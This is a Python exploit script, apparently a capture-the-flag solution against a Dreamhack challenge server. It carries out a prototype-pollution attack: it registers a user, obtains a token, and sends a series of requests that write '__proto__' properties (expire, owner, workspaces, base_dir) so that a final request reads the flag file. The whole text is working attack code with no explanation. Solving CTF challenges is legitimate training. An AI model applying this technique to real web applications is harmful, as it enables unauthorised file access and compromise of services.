import requests

URL = "http://host3.dreamhack.games:8339"
HEADERS = {"Content-Type":"application/json"}

useridStr = "exploit"
passStr = "__proto__exploit"

requests.post(URL + "/api/users", headers=HEADERS, json={"userid":useridStr,"pass":passStr})
res = requests.post(URL + "/api/users/auth", headers=HEADERS, json={"userid":useridStr,"pass":passStr})

TOKEN = res.json()["token"]

res = requests.post(URL + f"/api/users/{useridStr}/__proto__", headers=HEADERS, json={"token":TOKEN,"file_name":"expire","file_path":"999999999999999999999999","file_content":"exploit"})
print(res.json())

res = requests.post(URL + f"/api/users/{useridStr}/__proto__", headers=HEADERS, json={"token":TOKEN,"file_name":"owner","file_path":"__proto__","file_content":"exploit"})
print(res.json())

res = requests.post(URL + f"/api/users/{useridStr}/__proto__", headers=HEADERS, json={"token":TOKEN,"file_name":"workspaces","file_path":"exploit","file_content":"exploit"})
print(res.json())

res = requests.post(URL + f"/api/users/{useridStr}/__proto__", headers=HEADERS, json={"token":TOKEN,"file_name":"base_dir","file_path":"/usr/src/app","file_content":"exploit"})
print(res.json())

res = requests.post(URL + f"/api/users/{useridStr}/__proto__", headers=HEADERS, json={"token":TOKEN,"file_name":"zzzzz","file_path":"flag","file_content":"exploit"})
print(res.json())

res = requests.get(URL + "/api/users/__proto__/__proto__/zzzzz", headers=HEADERS, json={"token":"__proto__"})
print(res.json())